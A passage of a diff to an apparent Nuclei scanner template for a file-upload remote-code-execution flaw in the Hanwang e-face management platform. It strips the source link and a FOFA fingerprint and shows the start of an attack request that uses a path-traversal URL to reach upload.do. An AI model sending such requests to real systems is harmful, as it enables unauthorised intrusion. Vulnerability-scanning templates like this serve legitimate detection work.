@@ -3,12 +3,8 @@ info:
   name: 汉王e脸通综合管理平台 upload.do 存在文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gfqyhpvhagywrkul'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gfqyhpvhagywrkul
-    fofa: icon_hash="1380907357"
 http:
 - raw:
   - 'POST /manage/intercom/..%3B/..%3B/manage/resourceUpload/upload.do HTTP/1.1
